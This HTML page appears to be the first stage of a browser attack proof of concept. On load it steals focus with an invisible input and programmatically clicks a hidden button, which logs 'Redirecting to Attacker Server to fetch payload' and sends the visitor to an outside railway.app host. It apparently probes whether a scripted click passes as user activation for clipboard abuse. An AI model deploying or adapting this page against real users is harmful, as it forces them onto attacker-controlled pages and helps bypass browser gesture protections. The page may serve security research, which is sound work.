<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto-Click Clipboard Test (Stage 1)</title>
    <style>
        body {
            font-family: sans-serif;
            padding: 20px;
        }

        #statusOutput {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #ccc;
            background: #f4f4f4;
            border-radius: 5px;
            font-family: monospace;
            line-height: 1.5;
        }
    </style>
</head>

<body>
    <input type="text" id="focusStealer" autofocus style="opacity: 0; position: absolute; z-index: -1;">
    <button id="triggerBtn" style="display: none;">CLICK ME</button>

    <div id="statusOutput">
        <strong>Activity Log:</strong><br>
    </div>

    <script>
        const btn = document.getElementById("triggerBtn");
        const output = document.getElementById("statusOutput");

        function printToScreen(message) {
            output.innerHTML += "> " + message + "<br>";
        }

        btn.addEventListener("click", (event) => {
            printToScreen("Executing click event...");
            printToScreen(`Is this click trusted? ${event.isTrusted}`);
            printToScreen("<span style='color: blue;'>[+] Redirecting to Attacker Server to fetch payload...</span>");

            window.location.href = "https://user-activation-production.up.railway.app/test";
        });

        window.onload = () => {
            printToScreen("Stage 1 loaded. Waiting 2 seconds...");
            setTimeout(() => {
                printToScreen("Triggering automatic click to redirect...");
                window.focus();
                document.getElementById("focusStealer").focus();
                btn.focus();
                btn.click();
            }, 2000);
        };
    </script>
</body>

</html>
